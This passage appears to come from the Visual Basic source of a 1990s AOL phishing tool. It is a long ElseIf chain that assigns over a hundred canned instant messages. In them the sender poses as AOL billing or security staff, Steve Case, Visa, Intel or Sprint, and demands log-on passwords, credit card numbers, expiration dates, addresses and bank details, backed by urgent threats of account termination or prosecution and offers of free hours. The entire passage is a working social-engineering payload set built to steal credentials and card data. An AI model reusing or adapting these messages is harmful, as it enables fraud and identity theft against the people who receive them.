lAFE0 = "Hello member, I am with the TOS department of AOL.  Due to the ever changing TOS, it has dramatically changed.  One new addition is for me, and my staff, to ask where you dialed from and your password.  This allows us to check the REAL adress, and the password to see if you have hacked AOL.  Reply in the next 1 minute, or the account WILL be invalidated, thank you."
ElseIf lAFE0 = "24" Then
lAFE0 = "Hello member, and our accounts say that you have either enter an incorrect age, or none at all.  This is needed to verify you are at a legal age to hold an AOL account.  We will also have to ask for your log on password to further verify this fact. Respond in next 30 seconds to keep account active, thank you."
ElseIf lAFE0 = "25" Then
lAFE0 = "Dear member, I am Greg Toranis and I werk for AOL online security. We were informed that someone with that account was trading sexually explecit material. That is completely illegal, although I presonally do not care =).  Since this is the first time this has happened, we must assume you are NOT the actual account holder, since he has never done this before. So I must request that you reply with your password and first and last name, thank you."
ElseIf lAFE0 = "26" Then
lAFE0 = "Hello, I am Steve Case.  You know me as the creator of America Online, the world's most popular online service.  I am here today because we are under the impression that you have 'HACKED' my service.  If you have, then that account has no password.  Which leads us to the conclusion that if you cannot tell us a valid password for that account you have broken an international computer privacy law and you will be traced and arrested.  Please reply with the password to avoind police action, thank you."
ElseIf lAFE0 = "27" Then
lAFE0 = "Dear AOL member.  I am Guide zZz, and I am currently employed by AOL.  Due to a new AOL rate, the $10 for 20 hours deal, we must ask that you reply with your log on password so we can verify the account and allow you the better monthly rate. Thank you."
ElseIf lAFE0 = "28" Then
lAFE0 = "Hello I am CATWatch01. I witnessed you verbally assaulting an AOL member.  The account holder has never done this, so I assume you are not him.  Please reply with your log on password as proof.  Reply in next minute to keep account active."
ElseIf lAFE0 = "29" Then
lAFE0 = "I am with AOL's Internet Snooping Department.  We watch EVERY site our AOL members visit.  You just recently visited a sexually explecit page.  According to the new TOS, we MUST imose a $10 fine for this.  I must ask you to reply with either the credit card you use to pay for AOL with, or another credit card.  If you do not, we will notify the authorities.  I am sorry."
ElseIf lAFE0 = "30" Then
lAFE0 = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble. --AOL Security/B.A.H. Team"
ElseIf lAFE0 = "31" Then
lAFE0 = "Dear member, I am a Service Representitive with the America Online Corporation,and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time.  --AOL Cust. Service"
ElseIf lAFE0 = "32" Then
lAFE0 = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble.   --AOL Billing Department"
ElseIf lAFE0 = "33" Then
lAFE0 = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password."
ElseIf lAFE0 = "34" Then
lAFE0 = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number."
ElseIf lAFE0 = "35" Then
lAFE0 = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password."
ElseIf lAFE0 = "36" Then
lAFE0 = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
ElseIf lAFE0 = "37" Then
lAFE0 = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
ElseIf lAFE0 = "38" Then
lAFE0 = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
ElseIf lAFE0 = "39" Then
lAFE0 = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
ElseIf lAFE0 = "40" Then
lAFE0 = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your coop"
ElseIf lAFE0 = "41" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "42" Then
lAFE0 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf lAFE0 = "43" Then
lAFE0 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "44" Then
lAFE0 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf lAFE0 = "45" Then
lAFE0 = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
ElseIf lAFE0 = "46" Then
lAFE0 = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
ElseIf lAFE0 = "47" Then
lAFE0 = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
ElseIf lAFE0 = "48" Then
lAFE0 = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)   :AOL Billing"
ElseIf lAFE0 = "49" Then
lAFE0 = "During your sign on period your Credit Card number did not cycle,please respond with the credit card number used during sign-up!To remain signed on our service,If you do not reply we will have to terminate your account,If this happens please contact our 800# at [1-800-827-6364].Thank you for your time,for your cooperation your account will be credited 10 free hours!  :-)      :AOL Billing"
ElseIf lAFE0 = "50" Then
lAFE0 = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time.          :AOL Billing"
ElseIf lAFE0 = "51" Then
lAFE0 = "Sorry to disturb you, but are records indicate the the credit card number you gave us has expired.  Please click respond and type in your cc# so that i may verify this and correct all errors!"
ElseIf lAFE0 = "52" Then
lAFE0 = "I work for Intel, I have a great new catalouge! If you would like this catalouge and a coupon for $200 off your next Intel purchase, please click on respond, and give me your address, full name, and your credit card number. Thanks! |=-)"
ElseIf lAFE0 = "53" Then
lAFE0 = "Hello, I am TOS ADVISOR and seeing that I made a mistake  we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf lAFE0 = "54" Then
lAFE0 = "Pardon me, I am with AOL's Staff and due to a transmission error we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
ElseIf lAFE0 = "55" Then
lAFE0 = "Hello, I am with America Online and due to technical problems we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf lAFE0 = "56" Then
lAFE0 = "Dear User,     Upon sign up you have entered incorrect credit information. Your current credit card information  does not match the name and/or address.  We have rescently noticed this problem with the help of our new OTC computers.  If you would like to maintain an account on AOL, please respond with your Credit Card# with it's exp.date,and your Full name and address as appear on the card.  And in doing so you will be given 15 free hours.  Reply within 5 minutes to keep this accocunt active."
ElseIf lAFE0 = "57" Then
lAFE0 = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Tele#, Visa Card#, and Exp. Date. If this information is not received promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf lAFE0 = "58" Then
lAFE0 = "Hello and welcome to America online.  We know that we have told you not to reveal your billing information to anyone, but due to an unexpected crash in our systems, we must ask you for the following information to verify your America online account: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. After this initial contact we will never again ask you for your password or any billing information. Thank you for your time and cooperation.  :-)"
ElseIf lAFE0 = "59" Then
lAFE0 = "Hello, I am a represenative of the AOL User Resource Dept.  Due to an error in our computers, your registration has failed authorization. To correct this problem we ask that you promptly hit the `Respond` key and reply with the following information: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. We hope that you enjoy are services here at America Online. Thank You.  For any further questions please call 1-800-827-2612. :-)"
ElseIf lAFE0 = "60" Then
lAFE0 = "Hello, I am a member of the America Online Billing Department.  We are sorry to inform you that we have experienced a Security Breach in the area of Customer Billing Information.  In order to resecure your billing information, we ask that you please respond with the following information: Name, Addres, Tele#, Credit Card#, Bank Name, Exp. Date, Screen Name, and Log-on Password. Failure to do so will result in immediate account termination. Thank you and enjoy America Online.  :-)"
ElseIf lAFE0 = "61" Then
lAFE0 = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted! "
ElseIf lAFE0 = "62" Then
lAFE0 = "Hello AOL Member , I am with the OnLine Technical Consultants(OTC).  You are not fully registered as an AOL memberand you are going OnLine ILLEGALLY. Please respond to this IM with your Credit Card Number , your full name , the experation date on your Credit Card and the Bank.  Please respond immediatly so that the OTC can fix your problem! Thank you and have a nice day!  : )"
ElseIf lAFE0 = "63" Then
lAFE0 = "Hello AOL Memeber.  I am sorry to inform you that a hacker broke into our system and deleted all of our files.  Please respond to this IM with you log-on password password so that we can verify billing , thank you and have a nice day! : )"
ElseIf lAFE0 = "64" Then
lAFE0 = "Hello User.  I am with the AOL Billing Department.  This morning their was a glitch in our phone lines.  When you signed on it did not record your login , so please respond to this IM with your log-on password so that we can verify billing , thank you and have a nice day! : )"
ElseIf lAFE0 = "65" Then
lAFE0 = "Dear AOL Member.  There has been hackers using your account.  Please respond to this IM with your log-on password so that we can verify that you are not the hacker.  Respond immedialtly or YOU will be considered the hacker and YOU wil be prosecuted! Thank you and have a nice day.  : )"
ElseIf lAFE0 = "66" Then
lAFE0 = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted!"
ElseIf lAFE0 = "67" Then
lAFE0 = "AOL Member , I am sorry to bother you but your account information has been deleted by hackers.  AOL has searched every bank but has found no record of you.  Please respond to this IM with your log-on password , Credit Card Number , Experation Date , you Full Name , and the Bank.  Please respond immediatly so that we can get this fixed.  Thank you and have a nice day.   :)"
ElseIf lAFE0 = "68" Then
lAFE0 = "Dear Member , I am sorry to inform you that you have 5 TOS Violation Reports..the maximum you can have is five.  Please respond to this IM with your log-on password , your Credit Card Number , your Full Name , the Experation Date , and the Bank.  If you do not respond within 2 minutes than your account will be TERMINATED!! Thank you and have a nice day.  : )"
ElseIf lAFE0 = "69" Then
lAFE0 = "Hello,Im with OTC(Online Technical Consultants).Im here to inform you that your AOL account is showing a billing error of $453.26.To correct this problem we need you to respond with your online password.If you do not comply,you will be forced to pay this bill under federal law. "
ElseIf lAFE0 = "70" Then
lAFE0 = "Hello,Im here to inform you that you just won a online contest which consisted of a $3000 dollar prize.We seem to have lost all of your account info.So in order to receive your prize you need to respond with your log on password so we can rush your prize straight to you!  Thank you."
ElseIf lAFE0 = "71" Then
lAFE0 = "TrmsReport:	Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation."
ElseIf lAFE0 = "72" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again.  Thank you.  :-)"
ElseIf lAFE0 = "73" Then
lAFE0 = "Attention:The message at the bottom of the screen is void when speaking to AOL employess.We are very sorry to inform you that due to a legal conflict, the Sprint network(which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on.To correct this problem,We need you to click on RESPOND and enter your password, so we can update your personal Master-File,containing all of your personal info.  We are very sorry for this inconvience --AOL Customer Service Dept."
ElseIf lAFE0 = "74" Then
lAFE0 = "Hello, I am with the America Online Password Verification Commity. Due to many members incorrectly typing thier passwords at first logon sequence I must ask you to retype your password for a third and final verification. No AOL staff will ask you for your password after this process. Please respond within 2 minutes to keep this account active."
ElseIf lAFE0 = "75" Then
lAFE0 = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation "
ElseIf lAFE0 = "76" Then
lAFE0 = "Please disregard the message in red. Unfortunately, a hacker broke into the main AOL computer and managed to destroy our password verification logon routine and user database, this means that anyone could log onto your account without any password validation. The red message was added to fool users and make it difficult for AOL to restore your account information. To avoid canceling your account, will require you to respond with your password. After this, no AOL employee will ask you for your password again."
ElseIf lAFE0 = "77" Then
lAFE0 = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
ElseIf lAFE0 = "78" Then
lAFE0 = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation. "
ElseIf lAFE0 = "79" Then
lAFE0 = "Dear User, I am sorry to report that your account has been traced and has shown that you are signed on from another location.  To make sure that this is you please enter your sign on password so we can verify that this is you.  Thank You! AOL."
ElseIf lAFE0 = "80" Then
lAFE0 = "Hello, I am sorry to inturrupt but I am from the America Online Service Departement. We have been having major problems with your account information. Now we understand that you have been instructed not to give out and information, well were sorry to say but in this case you must or your account will be terminated. We need your full name as well as last, Adress, Credit Card number as well as experation date as well as logon password. We our really sorry for this inconveniance and grant you 10 free hours. Thank you and enjoy AOL."
ElseIf lAFE0 = "81" Then
lAFE0 = "Hello, My name is Dan Weltch from America Online. We have been having extreme difficulties with your records. Please give us your full log-on Scree Name(s) as well as the log-on PW(s), thank you :-)"
ElseIf lAFE0 = "82" Then
lAFE0 = "Hello, I am the TOSAdvisor. I am on a different account because there has been hackers invading our system and taking over our accounts. If you could please give us your full log on PW so we can correct this problem, thank you and enjoy AOL. "
ElseIf lAFE0 = "83" Then
lAFE0 = "Hello, I am from the America Online Credit Card Records and we have been experiancing a major problem with your CC# information. For us to fix this we need your full log-on screen names(s) and password(s), thank. "
ElseIf lAFE0 = "84" Then
lAFE0 = "Hi, I'm with Anti-Hacker Dept of AOL. Due to Thë break-in's into our system, we have experienced problems. We need you to respond with your credit card #, exp date, full name, address, and phone # to correct errors. "
ElseIf lAFE0 = "85" Then
lAFE4 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "86" Then
lAFE0 = "Hi, I'm with FCB (Federal Credit Bureau). Due to The type of payment you are using, we need to validate it. Please reply with your credit card number, expiration date, full name, address, and phone number. Thank you. "
ElseIf lAFE0 = "87" Then
lAFE0 = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that the validation process is almost complete.  To complete the validation process i need you to respond with your full name, address, phone number, city, state, zip code,  credit card number, expiration date, and bank name.  Thank you and enjoy AOL. "
ElseIf lAFE0 = "88" Then
lAFE0 = "AOLBilling:    Hello from the AOL TOS Staff. We have lost your billing info.  Please click respond and send your CC#, Expiration Date, and Billing Zip Code. We are sorry for this trouble. Your account has been credited 15 free hours :-)"
ElseIf lAFE0 = "89" Then
lAFE0 = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
ElseIf lAFE0 = "90" Then
lAFE0 = "AOLBilling:    Hello from the AOL TOS Staff. We have lost your account info. Please click respond and send your correct log-on password to your account. We are sorry for this trouble. Your account has been credited 15 free hours :-)"
ElseIf lAFE0 = "91" Then
lAFE0 = "Hello I am from the AOL service department and there has been a minor problem with your accout. I see that we have lost your password information and need it as soon as possible. We cannot access any of your personal info without your password. If you could please type your full log-on password and click the send button with your response. Thank you and Enjoy America online."
ElseIf lAFE0 = "92" Then
lAFE0 = "Hello, I am from AOLnet and there has been a network overload on our computers. We have been trying fix this problem but have had no luck. All your account information has been lost. In order for AOL to fix this we need your full First Name and Last, Your phone number, Address, Zip code, Credit Card Number and experation date, as well as your Screen Name(s) and Log-On Password(s). If you fail to reply will result in account termination, thank you :-)"
ElseIf lAFE0 = "93" Then
lAFE0 = "Hello I am a member of the America Online Stratus Team. We have been experiancing some problems with your preticular account. It would help us if you gave is your Screen Name(s) and Log-on Password(s) so we can remedy this problem. Thank you AOLST. "
ElseIf lAFE0 = "94" Then
lAFE0 = "Hello , AOL Customer! I am sorry to Inform you account information Was not Correctly Processed into our Stratus System. We are now forced to ask you to respond with your personal log on password and you complete billing info (Name, Address, & CC Number Information) . Thank-you for your Time, And Continue To enjoy AOL!"
ElseIf lAFE0 = "95" Then
lAFE0 = "Guide HAP:   Hello I work for AOL.  When you signed on we received an INCORRECT password.  Please respond with the CORRECT password now or face possible account termination for safety reasons, Thank you. =]"
ElseIf lAFE0 = "96" Then
lAFE0 = "Hi, I'm with STC (Standard Tele-Comm. Inc.) Due to a problem in phone transmission at your baud rate, I need to verify your log-on password before it can be fixed. Failure to comply will result in billing errors.  "
ElseIf lAFE0 = "97" Then
lAFE0 = "I am OnlineHost #147; an On-Line operator for America Online. Recently, computer Hackers have been logging on to the Network with your account. I have been logging them off when they failed validation. Please validate yourself as a registered user by stating your Credit Card# and expiration date. Thank you for your cooperation."
ElseIf lAFE0 = "98" Then
lAFE0 = "Good evening. I work with AOL's Network Security Division. Over the past few days, computer 'Hackers' have been logging on to the system using your account.  Please verify yourself as a registered user by stating your password, or face immediate account invalidation."
ElseIf lAFE0 = "99" Then
lAFE0 = "Hello! I am currently standing in as the TOSAdvisor because he is on vacation. I am sorry to inform you that your Password has been altered by computer Hackers. Your account will be terminated unless we can verify you as a registered user. Please type in your Password for system indentification. Thanks! :)"
ElseIf lAFE0 = "100" Then
lAFE0 = "Hello, I am with the America Online Billing department.  Please disreagrd the red letters at the bottom of the Instant Message window.  We have that there due to hackers who recently have been soliciting for passwords.  But Due to some sort of line noise or error when you logged on we were not able to verify your log on password.  Please reply with your log on password so that we may verify you, and we are sorry for the inconvinience."
ElseIf lAFE0 = "101" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
ElseIf lAFE0 = "102" Then
lAFE0 = "This is a message sent out to random America Online members for a catalog containing -cheap- Microsoft software. Please send your request for the catalog along with your credit card number fo the amount $19.95. After 3 weeks processing time you'll recive a copy of Microsoft Windows96 Nashville version. *Microsoft INC.*"
ElseIf lAFE0 = "103" Then
lAFE0 = "*America Online Screen Name Dept.* Sorry for this inconvenience but somehow your screen name has been duplicated by another member. Please change your screen name and E-Mail me with your new screen name and password, So you can be verified as a AOL member. Thank you, And you have 5 days to reply."
ElseIf lAFE0 = "104" Then
lAFE0 = "Hello, I am with Sprint United Telephone. There has been damages to the fiber optic network wich you are connected to America Online with. I must ask for your log-on password so AOL can verify your current membership status. Failure to do so will result in account termination. Continue to enjoy your use of AOL courtesy of Sprint-TelNet."
ElseIf lAFE0 = "105" Then
lAFE0 = "Hi, I am with the AOL inc. User Services Department. We are sorry to inform you that your account has not been logged correctly please re-enter your personal logon Password, So you can continue to stay with us on America Online...Hope to see you soon..."
ElseIf lAFE0 = "106" Then
lAFE0 = "Hello, I am a service representative of America On Line.  Due to a computer error in our password files, we ask that you change your current log-in password to  'Secure', until futher advised, for your account's security. For your inconvience we at America On Line would like to offer our thanks by adding 2 Free hours of online time to your account. Thank you for your time and inconvience."
ElseIf lAFE0 = "107" Then
lAFE0 = "Hello this is the America Online party service and it seems that you have one a new 566.6 modem. This is the fastest modem out to this day, for you to redeem this prize we need your full log-on password to make sure you are not a hacker on this account, Thank you and have a nice day!"
ElseIf lAFE0 = "108" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "109" Then
lAFE0 = "Hello. I work for the America On-Line User Database. Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password onlineHello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation.. Please click on RESPOND and send me this information immediately or face account termination!  Failure to comply, will result in account termination, Then you will have to wait 16 days and call our offices at 1-800-827-6364 to reactivate.Thank you for your cooperation, America On-Line User Services."
ElseIf lAFE0 = "110" Then
lAFE0 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "111" Then
lAFE0 = "Good evening, I am with the America Online Billing Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf lAFE0 = "112" Then
lAFE0 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf lAFE0 = "113" Then
lAFE0 = "Hello, I am form the America Online Billing Department.  I am sorry to report that we have been having trouble keeping your Billing Information valid.  To avoid cancellation of your account,  please click the respond button and type in the following:  Your Name, Your Address, Your Phone Number, and finnaly Your Credit Card Number and Expiaration Date,  then Press the Send button.  We are sorry for this inconvenience.  Thank you for your time and have a nice day."
ElseIf lAFE0 = "114" Then
lAFE0 = "Hello, I am from the America Online Billing Department.  I am sorry to report that we have been having trouble keeping your Billing Information valid.  To avoid cancellation of your account,  please click the respond button and type in the following:  Your Name, Your Address, Your Phone Number, and finnaly Your Credit Card Number and Expiaration Date,  then Press the Send button.  We are sorry for this inconvenience.  Thank you for your time and have a nice day."
ElseIf lAFE0 = "115" Then
lAFE0 = "Greetings CyberSurfer! I Am A Representative For the Online Banking System on AOL. As You May Have Read Credit Card Fraud is Huge on the 'Net'. Whould You Like To Safe Guard Your Credit Card Info With AOL? Just Reply With Your Credit Card Number And Full Information So That We may Logg Your Card Into Our Computers So No one else But You May Access It Online! We Are Offering This Safety Measure At No Cost to You At All!"
ElseIf lAFE0 = "116" Then
lAFE0 = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
ElseIf lAFE0 = "117" Then
lAFE0 = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
ElseIf lAFE0 = "118" Then
lAFE0 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "119" Then
lAFE0 = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
ElseIf lAFE0 = "120" Then
lAFE0 = "Hello I am with the America Online Security department. I know we have been telling you not to give out your passwords or billing info to anyone online but we did not expect to have our PWCC (PassWord Control Center) broken into. Please verify that you are the real user of this account by responding with your full screen name and password and your complete credit card information failure to respond with this information will result in the termination of your account. Thank you and enjoy America online. :-)"
ElseIf lAFE0 = "121" Then
lAFE0 = "Hello I am a undercover America Online billing representative. We have detected ''hackers'' using this account and purchasing goods with it, normally you would get stuck with the bill. But if you verify your credit card information so we will know you are the real user we can correct this problem. We at America Online are very sorry for this incident and we are starting a security enforcement program. that will prevent this from happening again. Thank You and have a nice day."
ElseIf lAFE0 = "122" Then
lAFE0 = "Welcome, I Am with America Online Credit Validators. Your credit card Information Has gone out of date. If you would like your account to stay active please respond with new credit card info, please reply with all the information so this error will not occur again. We at America Online are deticated In helping our customers! please feel free to call our 1-800 Number about our new credit plan. Thank you."
ElseIf lAFE0 = "123" Then
lAFE0 = "Hi, I am Chris Douglas and I'm from the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you and have a nice day."
ElseIf lAFE0 = "124" Then
lAFE0 = "Hello I am with the America Online Security department. I know we have been telling you not to give out your passwords or billing info to anyone online but we did not expect to have our PWCC (PassWord Control Center) broken into. Please verify that you are the real user of this account by responding with your full screen name and password and your complete credit card information failure to respond with this information will result in the termination of your account. Thank you and enjoy America online. :-)"
ElseIf lAFE0 = "125" Then
lAFE0 = "Hello I am a undercover America Online billing representative. We have detected ''hackers'' using this account and purchasing goods with it, normally you would get stuck with the bill. But if you verify your credit card information so we will know you are the real user we can correct this problem. We at America Online are very sorry for this incident and we are starting a security enforcement program. that will prevent this from happening again. Thank You and have a nice day"
ElseIf lAFE0 = "126" Then
lAFE0 = "Hi, I am Chris Douglas and I'm from the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you and have a nice day."
ElseIf lAFE0 = "127" Then
lAFE0 = "Welcome To America Online! Thank you for choosing us as your online provider. We need to verify your billing information, so if you could please respond with your full name, address, city, state, zip code, and credit card information we will update your system. Sorry for the incovenience. Thank You!"
ElseIf lAFE0 = "128" Then
lAFE0 = "Welcome to America Online! While you were entering your billing information into your account systems our server went down and lost all the information conserning your account. If you could please respond with your full name, address, city, state, zip, credit card information, and log-on Password we can quickly update your syetem. Sorry for the misshap and thanks in advance! :-)"
ElseIf lAFE0 = "129" Then
lAFE0 = "Good Evenning, I am with the CAT (Community Action Team) of AOL. We are search your records and your Screen name came up as a unregisterd user. Please respond with your name, address, phone #, city , state, zip, & all of your credit card information (Number, exp. date, ect...). Sorry for circumstances but this is **VERY IMPORTANT**!"
ElseIf lAFE0 = "130" Then
lAFE0 = " Due to our last system crash on 8/12/96 we have lost all infromation concerning your account. Please respond with your Full address and Credit Card Number. NOTE: 60 mins are credited to your account because of the crash also."
